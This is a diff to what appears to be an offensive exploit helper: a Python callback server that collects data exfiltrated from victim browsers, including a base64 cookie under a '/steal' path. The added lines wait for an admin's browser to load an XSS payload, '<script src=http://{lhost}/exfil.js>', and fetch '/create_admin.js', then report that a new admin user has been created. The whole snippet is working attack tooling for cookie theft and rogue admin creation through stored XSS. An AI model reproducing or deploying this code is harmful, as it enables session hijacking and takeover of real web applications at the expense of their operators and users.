@@ -34,6 +34,11 @@ Usage (copy start_server, SERVED_FILES, EXFIL_DATA into your exploit script):
         time.sleep(0.5)
     raw_b64 = EXFIL_DATA["/steal"]["b64_cookie"]
 
+    # Waiting for admin user to trigger the XSS payload: <script src=http://{lhost}/exfil.js>
+    while not any(r["path"] == "/create_admin.js" for r in REQUESTS):
+        time.sleep(0.5)
+    print_ok(f"New Admin User {random_username} created")
+
     # Shut down when done
     httpd.shutdown()
     httpd.server_close()
@@ -63,6 +68,9 @@ SERVED_FILES: dict = {}
 # {url_path: {param_name: param_value}} — data received from victim browser
 EXFIL_DATA: dict = {}
 
+# Every GET/POST hit (path, ip, timestamp) — logged regardless of query params
+REQUESTS: list = []
+
 # ==============================================================================
 # REQUEST HANDLER
 # ==============================================================================
@@ -78,6 +86,9 @@ class CallbackHandler(BaseHTTPRequestHandler):
         query_string = parsed.query
         client_ip    = self.client_address[0]
         timestamp    = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
+
+        # ── 0. Log every GET hit, even without query params ───────────────────
+        REQUESTS.append({"path": path, "ip": client_ip, "ts": timestamp})
 
         # ── 1. Capture exfil data from GET query parameters ───────────────────
         if query_string:
